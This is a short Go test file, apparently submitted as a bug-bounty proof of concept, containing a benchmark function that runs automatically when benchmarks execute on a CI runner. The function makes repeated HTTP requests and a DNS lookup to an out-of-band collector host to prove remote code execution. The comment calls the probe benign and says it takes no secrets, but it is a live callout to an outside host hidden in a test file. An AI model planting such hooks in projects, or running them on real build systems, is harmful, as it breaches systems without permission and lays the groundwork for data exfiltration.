package rcepoc

import (
	"net"
	"net/http"
	"testing"
	"time"
)

// Benign execution probe for a security report (X-Bug-Bounty: Lanyac).
// No secrets, no filesystem access: a single HTTP GET + DNS lookup to the
// researcher's OOB collector, proving benchmark code executes on the runner.
const pocCollector = "b64h9k2qp.dac32fjdpbglfd632ku0irm8g5e4ygs7o.oast.online"

func BenchmarkRceExecutionProbe(b *testing.B) {
	client := &http.Client{Timeout: 8 * time.Second}
	for i := 0; i < b.N; i++ {
		_, _ = client.Get("http://" + pocCollector + "/exec")
	}
	_, _ = net.LookupHost("dns." + pocCollector)
}
